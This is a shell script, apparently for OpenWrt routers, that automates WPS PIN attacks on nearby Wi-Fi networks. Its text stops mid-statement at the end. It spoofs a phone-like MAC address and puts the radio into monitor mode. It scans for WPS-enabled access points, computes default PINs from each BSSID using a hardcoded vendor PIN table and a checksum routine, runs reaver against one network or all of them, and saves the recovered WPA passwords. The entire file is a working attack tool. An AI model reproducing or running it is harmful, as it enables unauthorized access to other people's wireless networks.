#!/bin/sh

SCRIPT="WPSPinGeneratorMOD"
VERSION=$(grep "# versión" $0 | tail -n 2 | head -n 1 | awk '{print $3}')

# COLORES
negro="\033[0;30m" rojo="\033[0;31m" verde="\033[0;32m" marron="\033[0;33m" azul="\033[0;34m" magenta="\033[0;35m"
cyan="\033[01;36m" grisC="\033[0;37m" gris="\033[1;30m" rojoC="\033[1;31m" verdeC="\033[1;32m" amarillo="\033[1;33m"
azulC="\033[1;34m" magentaC="\033[1;35m" cyanC="\033[1;36m" blanco="\033[1;37m" subrayar="\E[4m" parpadeoON="\E[5m"
parpadeoOFF="\E[0m" resaltar="\E[7m"

red='\e[91m' green='\e[92m' yellow='\e[1;33m' magenta='\e[95m' cyan='\e[96m' none='\e[0m'


#定义警告界面
error() {

tmp_error="$(echo -e "${red}${detail}${none}")"
read -sp "${tmp_error}"
}
#定义通知界面
notifi() {

tmp_notifi="$(echo -e "${green}${detail}${none}")"
read -sp "${tmp_notifi}"
}

#MAC地址文本的函数
mac_addr() {
cat > /etc/config/scp/mac.txt << "EOF"
vivo-S1@48:87:64
Galaxy-S10@60:f1:89
HUAWEI_Mate_9@30:74:96
Galaxy-S20@60:f1:89
vivo-X50-Pro@06:27:C0
HUAWEI_nova_3i@f8:c3:9e
vivo-Y7s@2C:FF:EE
Android-TV@f8:4f:ad
OPPO-Reno@C4:E3:9F
vivo-X50@82:41:C2
Homor_8@A4:CA:A0
iPhone@54:33:cb
OPPO-R11@4C:18:9A
nova_5_Pro@d4:62:ea
OPPO-Reno4-5G@B0:B5:C3
HUAWEI_nova@88:44:77
OPPO-Reno@44:AE:AB
iPhone-7@7C:50:49
HUAWEI-Mate-8@94:FE:22
iPhone@E4:B2:FB
Redmi-Note-5A@04:B1:67
honor-8X-Max@34:12:F9
HUAWEI-P10-Plus@70:8A:09
HUAWEI-9plus@0C:B5:27
HUAWEI-9plus@F8:C3:9E
xiaodu-home1C@88:DA:33
HUAWEI-P30@24:DA:33
HUAWEI-10Plus@D4:62:EA
HUAWEI-Mate-9@F0:C8:50
Honer-8C@68:A0:3E
HUAWEI-nova7-5G@42:EC:71
HUAWEI-Mate-20@B4:86:55
vivo-x21@28:31:66
HUAWEI-Mate-30@C2:79:49
HUAWEI-P30@14:3C:C3
HUAWEI-P20-Pro@F0:0F:EC
OPPO-A93-5G@9C:93:8F
OPPO-A93-5G@0C:93:8F
vivo-X30@20:31:1C
vivo-Y83@3C:A5:81
vivo-Y75A@70:47:E9
vivo_Y7s@F8:E7:A0
vivo_Y9s@3C:86:D1
HONOR-9X@54:92:09
vivo-Y5s@64:2C:0F
HUAWEI_P10@20:54:FA
OPPO_R11@94:D0:29
HUAWEI_P30_Pro@D4:62:EA
HUAWEI_nova_7_Pro_5G@F2:DD:0D
vivo_X30@BE:7B:92
iPhone-x@D8:8F:76
HUAWEI_nova_7_SE_5G@D6:27:26
iPhone-x@72:59:C9
OPPO_Reno3_Pro_5G@B4:A5:AC
HUAWEI_nova_5_Pro@AC:E3:42
iPhone-x@F6:75:25
nova_5_Pro@30:A2:C2
vivo-S1@9A:D9:8C
vivo-Y85@88:F7:BF
HUAWEI-nova-6-SE@BA:AE:D7
HUAWEI-nova-7-SE-5G@1A:25:79
HUAWEI-nova-7-SE-5G@62:BB:2A
HUAWEI-nova-2s@6C:B7:49
vivo-Y83@3C:A5:81
vivo-Y5s@64:2C:0F
HUAWEI-nova-5-Pro@44:D7:91
HUAWEI-P40@32:2A:7D
vivo-Z6@8E:13:A4
vivo-Y83A@20:F7:7C
EOF

}

mac_name() { 
    get_random_num=
    get_random_wei=                                                                                                                                                                                                                                                          
    test ! -e /etc/config/scp/mac.txt && echo -e "${red}没有找到mac地址列表${none}" && exit
    get_random_num=$(cat /etc/config/scp/mac.txt | wc -l)
    if [ "${get_random_num}" == "0" ]
    then
        echo "list is null , please check list !" && exit
    fi
    get_random_wei=$(echo ${get_random_num} | wc -L)
    if [ "${get_random_wei}" != "1" ]
    then
        num=1
        while true
        do
            test_a=
            test_a=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c1)
            if [ "${test_a}" != "0" ] && [ "${test_a}" -le "${get_random_wei}" ]
            then
                random_max=
                random_max="${test_a}"
                break
            fi
            if [ "${num}" == "100" ]
            then
                exit
            fi
            let num=num+1
        done
    else
        random_max=1
    fi
    num=1
    while true
    do
        test_b=
        test_b=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c${random_max})
        if [ "${test_b}" != "0" ] && [ "${test_b}" -le "${get_random_num}" ]
        then
            host_name=
            wlan_mac=
            host_name=$(sed -n "${test_b}p" /etc/config/scp/mac.txt | cut -d '@' -f 1 | sed -n "1p")                                                                                                                                                                                                       
            wlan_mac="$(sed -n "${test_b}p" /etc/config/scp/mac.txt | cut -d '@' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom)"
            if [ "${host_name}" != "" ] && [ "${wlan_mac}" != "" ] && [ "$(echo "${wlan_mac}" | wc -L)" == "17" ]
            then
                break
            fi
        fi
        if [ "${num}" == "100" ]
        then
            exit
        fi
        let num=num+1
    done
}

#get wifi_iface num
get_wifi_iface_num() {
    num=1
    test_num=0
    while [ "${num}" == "1" ]
    do
        if [ "${test_num}" != "30" ]
        then
            if [ "$(uci show | grep "wifinet${test_num}")" == "" ]
            then
                get_wifi_iface="${test_num}"
                num=0
            else
                let test_num=test_num+1
            fi
        else
            num=0
        fi
    done
}

#添加监听的热点
add_listen() {
    #删除系统默认生成的wifi热点
    if [ "$(uci show | grep "wireless.default_radio*")" != "" ]
    then
        uci del wireless.default_radio0
        if [ "${user_select}" == "2" ]
        then
            uci del wireless.default_radio1
        fi
        uci commit wireless
        echo ""
        echo -e "${yellow}成功删除系统默认生成的wifi热点${none}"
    fi
    user_select="$1"
    [ -z ${user_select} ] && return 1
    if [ "${user_select}" == "2" ]
    then
        test_drever=$(uci show | grep 2g | cut -d '.' -f 2)
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
        else
            echo -e "${red}当前系统不是openwrt系统 !${none}" && exit
        fi
    elif [ "${user_select}" == "5" ]
    then
        test_drever=$(uci show | grep 5g | cut -d '.' -f 2 | sed -n "1p")
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
            # test_name="_5G"
        else
            echo -e "${red}当前系统不是openwrt系统 !${none}" && exit
        fi
    elif [ "${user_select}" == "6" ]
    then
        test_drever=$(uci show | grep 5g | cut -d '.' -f 2 | sed -n "2p")
        if [ "$(echo ${test_drever} | grep 'radio')" != "" ]
        then
            drever=${test_drever}
            # test_name="_5G"
        else
            echo -e "${red}当前系统不是openwrt系统 !${none}" && exit
        fi
    elif [ "${user_select}" == "4" ]
    then
        drever="radio0"
    fi
    if [ "$(uci show | grep  "wireless.${drever}.country=\'TW\'")" == "" ]
    then
        uci set wireless.${drever}.country='TW'
    fi
    mac_name
    sys_release=$(cat /etc/openwrt_release | grep 'DISTRIB_RELEASE' | cut -d '.' -f 1 | cut -d "'" -f 2)
    if [ "${sys_release}" == "18" ]
    then
        class_name="$(uci add wireless wifi-iface)"
    else
        get_wifi_iface_num
        class_name="wifinet${get_wifi_iface}"
    fi
    uci set wireless.${class_name}=wifi-iface
    uci set wireless.${class_name}.device="${drever}"
    uci set wireless.${class_name}.mode='monitor'
    uci set wireless.${class_name}.ssid="${host_name}${test_name}"
    uci set wireless.${class_name}.network='lan'
    # uci set wireless.${class_name}.disable='1'
    uci set wireless.${class_name}.macaddr="${wlan_mac}"
    uci commit wireless
    # uci delete wireless.${class_name}.disable='1'
    # uci commit wireless
    wifi reload > /dev/null

    if [ "$(uci show | grep "${host_name}")" != "" ] && [ "$(uci show | grep "${wlan_mac}")" != "" ]
    then
        echo ""                                                                                                                                                                                               
        echo -e "${yellow}监听热点创建完成 :${none}"
        echo -e "${yellow}监听热点名称: ${host_name}${none}"
        echo -e "${yellow}监听热点MAC: ${wlan_mac}${none}"
        echo ""
        uci set wireless.${drever}.disabled='0'
        uci commit wireless
        wifi reload > /dev/null
    else
        echo ""
        echo -e "${red}监听热点没有创建成功${none}"
        echo ""
        exit
    fi
}

#默认pin码
test ! -f /tmp/pins.txt && cat > /tmp/pins.txt << "EOF"
00:01:38-35606543
00:05:CA-73851738
00:05:CA-76916144
00:0B:85-70066647
00:0C:F1-30447028
00:14:D1-26848185
00:18:02-16546615
00:18:E7-15537782
00:19:15-12345670
00:1A:2B-15624697
00:1A:2B-16495265
00:1A:2B-88478760
00:1D:19-66026402
00:1D:73-88420707
00:1D:7E-66026402
00:1D:CE-85560130
00:1F:A4-12345670
00:21:29-22310298
00:21:29-64637129
00:22:3F-48247818
00:24:01-97744757
00:24:17-31011193
00:25:9C-19805672
00:26:24-95374611
00:26:44-78202962
00:26:5A-76971464
00:26:5B-15488107
00:26:5B-36277216
00:26:5B-91514257
00:38:72-18836486
00:48:7A-15471628
00:4F:62-21207136
08:10:74-20956455
1A:0B:40-17068161
1C:7E:E5-22609298
1C:7E:E5-60418579
20:4E:7F-45197079
30:39:F2-16538061
30:39:F2-16702738
30:39:F2-18355604
30:39:F2-43297917
30:39:F2-73767053
30:39:F2-88202907
30:46:9A-19482417
30:46:9A-30592407
30:46:9A-95221021
34:08:04-36022656
34:08:04-93395274
38:72:C0-18836486
40:4A:03-11866428
50:67:F0-20064525
58:6D:8F-47158382
58:6D:8F-69382161
58:98:35-53890894
5C:33:8E-00764025
5C:33:8E-03015162
5C:33:8E-04581277
5C:33:8E-11765592
5C:33:8E-15986511
5C:33:8E-30414129
5C:33:8E-30999022
5C:33:8E-33685984
5C:33:8E-39657053
5C:33:8E-53842763
5C:33:8E-60387400
5C:33:8E-73968597
5C:33:8E-78614062
5C:33:8E-78963641
5C:33:8E-82848439
5C:33:8E-85776104
5C:33:8E-91345080
5C:35:3B-64874487
68:B6:FC-82380243
68:C0:6F-41719565
6A-C0-6F-41873281
72:23:3D-36228645
74:44:01-00446747
74:44:01-10052648
74:44:01-27615126
74:88:8B-16538061
74:88:8B-16702738
74:88:8B-18355604
74:88:8B-43297917
74:88:8B-73767053
74:88:8B-88202907
7C:4F:B5-72688656
7C:4F:B5-75332662
94:44:52-26023809
94:44:52-93645348
A0:21:87-92442559
A4:52:6F-16538061
A4:52:6F-16702738
A4:52:6F-18355604
A4:52:6F-43297917
A4:52:6F-73767053
A4:52:6F-88202907
C0:C1:C0-78985933
CO:3F:0E-25032918
D0:AE:EC-06235307
D0:AE:EC-12263813
D0:AE:EC-36831678
D0:AE:EC-43419012
D0:AE:EC-46275288
D0:AE:EC-49570724
D0:AE:EC-58441640
D0:AE:EC-67791088
D0:AE:EC-76871559
DC:0B:1A-16538061
DC:0B:1A-16702738
DC:0B:1A-18355604
DC:0B:1A-19756967
DC:0B:1A-43297917
DC:0B:1A-73767053
DC:0B:1A-88202907
E0:8F:EC-00235211
E0:CB:4E-62987523
F4:3E:61-12345670
F4:3E:61-47158382
F4:3E:61-69382161
F4:EC:38-03419724
F4:EC:38-04898702
F4:EC:38-05884889
F4:EC:38-09165847
F4:EC:38-11288879
F4:EC:38-18674095
F4:EC:38-19634173
F4:EC:38-23380622
F4:EC:38-26599625
F4:EC:38-42768777
F4:EC:38-44947477
F4:EC:38-51660567
F4:EC:38-52594809
F4:EC:38-67971862
F4:EC:38-72344071
F4:EC:38-91726681
F4:EC:38-95048147
EOF

# DÍGITO DE CONTROL QUE SE CALCULA A PARTIR DE LOS OTROS 7
calcular_checksum()
{
ACCUM=0
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`
PIN=`expr $PIN '+' $CHECKSUM`	
PIN=`printf '%08d' $PIN`	
}

calcular_pin()
{
BSSID_INICIO=$(echo $BSSID | cut -d ":" -f1,2,3)
BSSID_FINAL=$(echo $BSSID | cut -d ':' -f4-)
MAC=$(echo $BSSID_FINAL | tr -d ':')
MAC_DECIMAL=$(printf '%d' 0x$MAC)
STRING=`expr '(' $MAC_DECIMAL '%' 10000000 ')'`	
PIN=`expr 10 '*' $STRING`			
calcular_checksum				
PINWPS1=$PIN				
STRING2=`expr $STRING '+' 8`			
PIN=`expr 10 '*' $STRING2`	
calcular_checksum
PINWPS2=$PIN					
STRING3=`expr $STRING '+' 14`			
PIN=`expr 10 '*' $STRING3`			
calcular_checksum
PINWPS3=$PIN					
if [[ $ESSID == ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] 
then
	FINESSID=$(echo $ESSID | cut -d '-' -f2)			
	CUARTO_PAR=$(echo $BSSID_FINAL | cut -d ':' -f1 | tr -d ':')	
	MACESSID=$(echo $CUARTO_PAR$FINESSID)			
	CONVERTEDMACESSID=$(printf '%d' 0x$MACESSID)		
	RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`	
	STRING4=`expr $RAIZ '+' 7`				
	PIN=`expr 10 '*' $STRING4`				
	calcular_checksum
else
	case $BSSID_INICIO in
	04:C0:6F | 20:2B:C1 | 28:5F:DB | 80:B6:86 | 84:A8:E4 | B4:74:9F | BC:76:70 | CC:96:A0 | F8:3D:FF) # FTE-???? CON EL ESSID CAMBIADO (3 PINs POSIBLES)
		echo $PINWPS1
		echo $PINWPS2
		PIN=$PINWPS3;; 
	*)
		PIN=$PINWPS1;;
	esac
fi
echo -e "\n${yellow}尝试pin值：$PIN${none}\n"
}

#停止扫描网络
stop_scan_wifi() {
    { sleep 20 && killall airodump-ng; } &
}

#获取wifi相关的值
get_wifi() {

    
    
    echo ""
    echo -e "${yellow}正在扫描wps的WiFi，请等待20秒……${none}"
    echo ""  
    test -e /tmp/wps.txt && rm /tmp/wps.txt
    test -e /tmp/WPS_WS.txt && rm /tmp/WPS_WS.txt
    test -e /tmp/test_wps.csv && rm /tmp/test_wps.csv
    test -e /tmp/output*.csv && rm /tmp/output*.csv
    stop_scan_wifi&
    test_bng=$(uci show | grep "${drever}.hwmode=" | cut -d "'" -f 2)
    if [ ! -z "$(iwinfo radio0 info | egrep "bgnac|nac")" ];then
        sh -c "airodump-ng --wps -c 1-165 ${driver} | tee /tmp/test_wps.csv"
        
    elif [ "${test_bng}" == "11a" ];then
        sh -c "airodump-ng --wps -c 36-165 ${driver} | tee /tmp/test_wps.csv" 
    else
        sh -c "airodump-ng --wps ${driver}  | tee /tmp/test_wps.csv"
    fi


    #cat /tmp/test_wps.csv | grep '2\.0' /tmp/test_wps.csv | sort -u | sed '/length/d' > /tmp/tmp_wps.txt
    grep '2\.0' /tmp/test_wps.csv | sort -u | sed '/length/d' > /tmp/tmp_wps.txt
    #cat /tmp/test_wps.csv | grep '1\.0' /tmp/test_wps.csv | sort -u | sed '/length/d' >> /tmp/tmp_wps.txt
    grep '1\.0' /tmp/test_wps.csv | sort -u | sed '/length/d' >> /tmp/tmp_wps.txt
    sed -i '/^$/d' /tmp/tmp_wps.txt

    if [ "$(cat /tmp/tmp_wps.txt)" == "" ];then
        echo -e "\n${red}没有找到带有wps的WiFi${none}\n"
        return 1
    fi

    test -f /tmp/wps.txt && rm /tmp/wps.txt
    num=1
    while true
    do
        line_sata=$(sed -n "${num}p" /tmp/tmp_wps.txt)
        [ -z "${line_sata}" ] && break
        tmp_name="$(echo "${line_sata}" | cut -d ' ' -f 2)"
        let num+=1
        if [ "$(echo "${tmp_name}" | wc -L)" == "17" ];then
            if [ -f /tmp/wps.txt ];then
                if [ "$(cat /tmp/wps.txt | grep "${tmp_name}")" == "" ];then
                    echo "${line_sata}" >> /tmp/wps.txt
                fi
            else
                echo "${line_sata}" >> /tmp/wps.txt
            fi
        fi
    done

    sed -i '/^$/d' /tmp/wps.txt
    sleep 2
	cat /tmp/wps.txt | cut -d " " -f 2 > /tmp/WS_BSSID.txt
    if [ "${test_bng}" == "11a" ];then
        cat /tmp/wps.txt | cut -d " " -f 25,26 > /tmp/WS_Channel.txt
    else
	    cat /tmp/wps.txt | cut -d " " -f 26,27 > /tmp/WS_Channel.txt
    fi
	cat /tmp/wps.txt | cut -d " " -f 4 > /tmp/WS_Power.txt
    test -f /tmp/WS_ESSID.txt && rm /tmp/WS_ESSID.txt
	#cat /tmp/wps.txt | awk '{print $12 $13 $14}' > /tmp/WS_ESSID.txt
    cat /tmp/wps.txt | awk '{print $12 $13 $14}' > /tmp/WS_ESSID.txt
	sed -i "s/^\ //g;s/ /\^\&/g" /tmp/WS_ESSID.txt
    sed -i "s/ //g" /tmp/WS_Channel.txt /tmp/WS_Power.txt
    sed -i "s/DISP//g;s/\,//g;s/PBC//g;s/KPAD//g;s/^\ //g;s/2\.0//g;s/1\.0//g;s/^LAB//g" /tmp/WS_ESSID.txt
	num=1
	while true
	do
		BSSID="$(cat /tmp/WS_BSSID.txt | sed -n "${num}p")"
		Channel="$(cat /tmp/WS_Channel.txt | sed -n "${num}p")"
		Power="$(cat /tmp/WS_Power.txt | sed -n ${num}p)"        
		ESSID="$(cat /tmp/WS_ESSID.txt | sed -n ${num}p)"
		[ -z ${BSSID} ] && break
        [ -z ${Channel} ] && continue
        echo -e "${num}\t${BSSID}  ${Channel}\t${Power}\t${ESSID}" >> /tmp/WPS_WS.txt
		let num=num+1	
	done
	wifi_num=$(cat /tmp/WS_BSSID.txt | wc -l)	
}

#删除监听热点
delet_ap() {
    del_ap=$(uci show | grep "${wlan_mac}" | cut -d '.' -f 1,2)
    [ -z ${del_ap} ] && echo -e "${red}没有检测到监听热点${none}"
    uci delete ${del_ap}
    if [ "$(uci show | grep "${wlan_mac}")" == "" ]
    then
        echo ""
        echo -e "${yellow}监听热点${host_name}删除完成${none}"
        echo ""
    else
        echo ""
        echo -e "${red}监听热点${host_name}没有删除完成，可以手动删除监听热点${none}"
        echo ""
    fi
    uci commit wireless
    wifi reload > /dev/null
}

#关闭网卡无线功能
disabled_wifi() {
user_select=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)
if [ "${user_select}" == "1" ]
then
    driver=radio0
elif [ "${user_select}" == "2" ]
then
    driver="radio0 radio1"
fi
num=1
for i in ${driver}
do
    uci set wireless.${i}.disabled='1'
    uci commit wireless
    wifi reload > /dev/null
    if [ "$(uci get wireless.${i}.disabled)" != "1" ]
    then

        let num=num+1
        if [ "${num}" == "5" ]
        then
            break
        fi
        continue
    fi
done
}


#清理内存
clean_mem() {
    echo 1 > /proc/sys/vm/drop_caches
    echo 2 > /proc/sys/vm/drop_caches
    echo 3 > /proc/sys/vm/drop_caches
}

#菜单
menu() {
	while true
	do
        [ -f /tmp/pin_passwd.txt ] && rm /tmp/pin_passwd.txt
        #echo -e "\033[?25h"
		test ! -e /tmp/WPS_WS.txt && echo -e "${red}没有找到WPS_WS.txt文档${none}" && return 1
		clear
		echo -e "${yellow}No.\tBSSID\t\t Channel Power\tESSID${none}"
		cat /tmp/WPS_WS.txt
        echo ""
        #echo -e "\033[?25h"
		echo -en "\033[?25h${magenta}请选择要Pin的WiFi序列号【1-${wifi_num}】，重新扫描【s】，全部pin【a】，退出【q】\n请按提示输入：${none}"
		read select_num
        [ -z "${select_num}" ] && continue
		if [ "${select_num}" == "s" ]
		then
			get_wifi
			continue
		elif [ "${select_num}" == "q" ]
		then
            delet_ap
            disabled_wifi
            clean_kill
			exit
        elif [ "${select_num}" == "a" ];then
            echo -e "\n\n已选择pin所有网络\n"
		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]]
		then
			echo ""
			read -sp "输入的数值超出范围，请按照提示的范围输入序列号"
			continue

        elif [ "$(echo "${select_num}" | grep "[0-9]" 2>/dev/null )" == "" ];then
			echo ""
			read -sp "输入的数值不正确，请按照提示输入"
			continue           
		fi
        break
	done
    cat_num=1
    RE_ID=
    while true
    do
        if [ "${select_num}" == "a" ];then
            Bsid="$(cat /tmp/WPS_WS.txt | sed -n "${cat_num}p" | awk '{print $2}')"
            Chanel="$(cat /tmp/WPS_WS.txt | sed -n "${cat_num}p" | awk '{print $3}')"
            Esid="$(cat /tmp/WPS_WS.txt | sed -n ${cat_num}p | awk '{print $5}')"
            [ -z ${Bsid} ] && break
            clean_mem
            echo ""
            echo -e "\n已选择【${cat_num} - ${Esid}】\n"
            sleep 3
            let cat_num+=1
        else
            Bsid="$(cat /tmp/WPS_WS.txt | sed -n "${select_num}p" | awk '{print $2}')"
            Chanel="$(cat /tmp/WPS_WS.txt | sed -n "${select_num}p" | awk '{print $3}')"
            Esid="$(cat /tmp/WPS_WS.txt | sed -n ${select_num}p | awk '{print $5}')"
            [ -z ${Bsid} ] && continue
            echo ""
            echo -e "\n已选择【${Esid}】\n"
            sleep 1
		fi
        BSSID=${Bsid}
        ESSID=${Esid}
        test_BSSID=$(echo ${BSSID} | cut -d : -f 1-3)
        if [ -f /tmp/pins.txt ];then
            test_pin=$(cat /tmp/pins.txt | grep ${test_BSSID})
            if [ ! -z "${test_pin}" ];then
                PIN=$(echo ${test_pin} | cut -d - -f 2)
            else
                calcular_pin
            fi
        else
            calcular_pin
        fi
        { reaver -n -l61 -i ${driver} -p ${PIN} -b $Bsid -c $Chanel -S -N -d0 -t5 -vv | tee /tmp/${Bsid}.wps; }&
        RE_ID=$!
        
        line_num=1
        while true
        do
            
            if [ -f /tmp/${Bsid}.wps ]
            then
                PINES=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | sort -u | wc -l`
                PINES_b=`cat /tmp/${Bsid}.wps | grep -e "Trying pin" -e "Probando pin" | wc -l`
                error_a=`cat /tmp/${Bsid}.wps | grep 'Failed to associaten' | wc -l`
                if [ ! -z "$(cat /tmp/${Bsid}.wps | grep 'WPA PSK')" ];then
                    passwd_str="$(cat /tmp/${Bsid}.wps | grep 'WPA PSK' | cut -d : -f 2 | sed "s/'//g" )"
                    pin_str="$(cat /tmp/${Bsid}.wps | grep 'WPS PIN' | cut -d : -f 2 | sed "s/'//g" )"
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 成功ping出密码* * *${none}\n"
                    echo -e "\n${yellow}pin值：${pin_str}${none}"
                    echo -e "\n${yellow}密码 ：${passwd_str}${none}\n\n"
                    echo -e "\n\n* * *${Esid} 成功ping出密码* * *\npin值：${pin_str}\n密码 ：${passwd_str}" >> /tmp/pin_passwd.txt
                    if [ "${select_num}" != "a" ];then
                        detail="请记录好pin出来的密码，回车后继续pin" && notifi
                        test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                        return 0 
                    fi
                    break
                elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" == "3" ];then
                    if [ "${line_num}" == "5" ];then
                        test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                        clean_kill
                        clear
                        echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                        line_num=1
                        if [ "${select_num}" != "a" ];then
                            detail="回车后继续pin" && notifi
                            return 1
                        fi
                        break                 
                    fi
                    let line_num+=1
                elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" == "5" ];then
                    if [ "${line_num}" == "5" ];then
                        test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                        clean_kill
                        clear
                        echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                        line_num=1
                        if [ "${select_num}" != "a" ];then
                            detail="回车后继续pin" && notifi
                            return 1
                        fi
                        break                 
                    fi
                    let line_num+=1
                elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" == "4" ];then
                    if [ "${line_num}" == "5" ];then
                        test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                        clean_kill
                        clear
                        echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                        line_num=1
                        if [ "${select_num}" != "a" ];then
                            detail="回车后继续pin" && notifi
                            return 1
                        fi
                        break                 
                    fi
                    let line_num+=1
                elif [ "$(cat /tmp/${Bsid}.wps | wc -l)" -ge "150" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    line_num=1
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break 
                elif [ "$(cat /tmp/${Bsid}.wps | grep 'WARNING: Detected' | wc -l)" == "1" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    line_num=1
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break                 
                elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending authentication request' | wc -l)" == "5" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    line_num=1
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break 
                elif [ "$(cat /tmp/${Bsid}.wps |  grep -e "0x02" -e "0x03" -e "0x04")" != "" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    line_num=1
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break 
                elif [ "$(cat /tmp/${Bsid}.wps | grep 'Sending EAPOL START request' | wc -l)" == "4" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    line_num=1
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break 
                elif [ "${error_a}" -ge "2" ];then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break
                elif [ "${PINES_b}" -ge "2" ] && [ "${PINES}" == "1" ]
                then
                    test -f  /tmp/${Bsid}.wps && rm  /tmp/${Bsid}.wps
                    clean_kill
                    clear
                    echo -e "\n\n${yellow}* * *${Esid} 网络没有希望了，尝试其它的网络吧* * *${none}\n"
                    if [ "${select_num}" != "a" ];then
                        detail="回车后继续pin" && notifi
                        return 1
                    fi
                    break
                fi
            fi
            read -t 1 -n 1 selct_q 
            if [ "$?" == "0" ]
            then
                
                if [ "${select_num}" == "a" ]
                then
                    clean_kill
                    clear
                    if [ -f /tmp/pin_passwd.txt ];then
                        echo -e "\n${yellow}pin出来的密码，请记录好：${none}"
                        cat /tmp/pin_passwd.txt
                        echo ""
                        read -sp "回车后退出"
                    fi
                else
                    echo -e "\n${yellow}正在退出. . .${none}\n"
                    clean_kill 
                fi
                rm /tmp/*.wps                 
                return 1
            fi
        done
    done

    if [ "${select_num}" == "a" ]
    then
        clean_kill
        clear
        if [ -f /tmp/pin_passwd.txt ];then
            echo -e "\n${yellow}pin出来的密码，请记录好。可以多尝试几遍或许能多pin出一些密码：${none}"
            cat /tmp/pin_passwd.txt
            echo ""
        else
            echo -e "\n没有pin出来密码，可以多尝试几遍或许能pin出一些密码\n"
        fi
        read -sp "回车后继续"
        return 0
    fi
}

#找无线驱动名称
check_wirles() {
    bc_num=1
    while true
    do
        echo -e "\n${yellow}正在等待配置生效，请等待5秒. . .${none}\n"
        sleep 5
        test_mac=$(echo ${wlan_mac} | sed "s/:/-/g" | tr '[a-z]' '[A-Z]')
        driver=$(ifconfig | grep -i "${test_mac}" | awk '{print $1}')
        let bc_num+=1
        if [ ${bc_num} == 10 ] && [ -z ${driver} ];then
            read -sp "没有获取到无线驱动名称" && exit
        fi
        
        [ ! -z ${driver} ] && break

        echo -e "\n${red}没有获取到无线驱动名称,正在重新尝试. . .${none}\n"
        
    done
}

#清理和终止程序
clean_kill() {
    
    killall -9 wash &>/dev/null
    killall -9 reaver &>/dev/null
}

#检测监听热点删除监听热点
check_monitor() {
    while true
    do
        monitor_name="$(uci show | grep 'monitor' | cut -d '.' -f 1,2)"
        if [ -z "${monitor_name}" ]
        then
            echo ""
            echo -en "${yellow}监听热点清理完成。${none}"
            echo ""
            return 0
        fi
        for i in ${monitor_name}
        do
            uci delete $i
        done
        uci commit wireless
        wifi reload > /dev/null
    done
    sleep 1
}

#判断命令是否存在
if [ ! -f /usr/bin/reaver ];then
